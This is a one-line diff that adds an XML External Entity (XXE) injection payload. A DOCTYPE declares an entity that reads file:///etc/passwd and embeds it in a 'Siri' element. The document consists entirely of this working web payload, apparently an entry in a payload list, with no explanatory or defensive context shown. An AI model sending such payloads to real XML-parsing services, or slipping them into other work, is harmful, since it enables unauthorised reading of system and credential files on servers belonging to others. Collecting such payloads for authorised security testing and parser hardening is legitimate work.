@@ -1,0 +1,1 @@
+<!DOCTYPE Siri [<!ENTITY secret SYSTEM "file:///etc/passwd">]><Siri>&secret;</Siri>
